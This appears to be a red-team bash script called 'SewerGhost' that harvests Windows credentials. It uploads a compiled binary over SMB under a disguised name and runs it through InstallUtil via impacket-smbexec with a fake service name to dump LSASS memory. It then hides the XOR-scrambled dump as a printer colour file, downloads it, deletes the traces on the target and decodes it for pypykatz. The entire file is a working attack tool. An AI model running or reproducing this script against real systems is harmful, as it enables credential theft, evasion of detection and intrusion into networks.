#!/bin/bash
# ==============================================================================
# SewerGhost - Automated Credential Harvester (InstallUtil Edition)
# Author: [Your Name/Email] - CDT Bravo Red Team
# Goal: Stealthy LSASS dump, XOR scramble, and remote cleanup.
# ==============================================================================

# --- Argument Mapping ---
TARGET_IP=$1
SMB_USER=$2
SMB_PASS=$3

# Check if all arguments are provided
if [ -z "$TARGET_IP" ] || [ -z "$SMB_USER" ] || [ -z "$SMB_PASS" ]; then
    echo "Usage: ./run.sh <IP> <User> <Pass>"
    exit 1
fi

# Discrete Staging Paths
# We move the EXE to Tasks and the LOOT to the Spooler directory from your screenshot
LOCAL_CS_FILE="SewerScanner.cs"
LOCAL_EXE="SewerScanner.exe"
REMOTE_EXE_PATH="C:\\Windows\\Tasks\\metadata.exe"
REMOTE_LOOT_PATH="C:\\Windows\\System32\\spool\\drivers\\color\\ExpressColor_v4.dat"
LOCAL_LOOT_NAME="ExpressColor.dat"
DECODED_DMP="lsass.dmp"

# XOR Key (Must match your C# code)
XOR_KEY="0xDE 0xAD 0xBE 0xEF"

echo "[*] --- Starting SewerGhost Operation ---"
echo "[*] Target: $TARGET_IP | User: $SMB_USER"
# 1. Compilation
echo "[*] Phase 1: Compiling C# assembly with InstallUtil references..."
mcs -out:$LOCAL_EXE $LOCAL_CS_FILE -r:System.Configuration.Install.dll
if [ $? -ne 0 ]; then
    echo "[-] Compilation failed! Ensure mono-mcs is installed."
    exit 1
fi

# 2. Upload/Staging
echo "[*] Phase 2: Staging binary to $REMOTE_EXE_PATH..."
impacket-smbclient "$SMB_USER":"$SMB_PASS"@$TARGET_IP <<EOT
cd C:\Windows\Tasks
put $LOCAL_EXE metadata.exe
exit
EOT

# 3. Execution
echo "[*] Phase 3: Triggering dump via InstallUtil (Uninstall Mode)..."
# Using smbexec to run the command silently in the background
impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -service-name "WinMgmtUpdate" <<EOT
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $REMOTE_EXE_PATH
exit
EOT

# Give the dump 5 seconds to complete and scramble
sleep 5

# 4. Exfiltration & Cleanup
echo "[*] Phase 4: Grabbing loot and wiping traces..."
impacket-smbclient "$SMB_USER":"$SMB_PASS"@$TARGET_IP <<EOT
cd C:\Windows\System32\spool\drivers\color
get ExpressColor_v4.dat $LOCAL_LOOT_NAME
del ExpressColor_v4.dat
cd C:\Windows\Tasks
del metadata.exe
exit
EOT

# 5. Decoding
echo "[*] Phase 5: Descrambling XOR data..."
python3 -c "key=b'\xde\xad\xbe\xef'; d=open('$LOCAL_LOOT_NAME','rb').read(); open('$DECODED_DMP','wb').write(bytes(d[i]^key[i%len(key)] for i in range(len(d))))"

echo "[+] Operation Successful."
echo "[!] Local files: $DECODED_DMP (Ready for pypykatz)"
echo "[*] --- End of Line ---"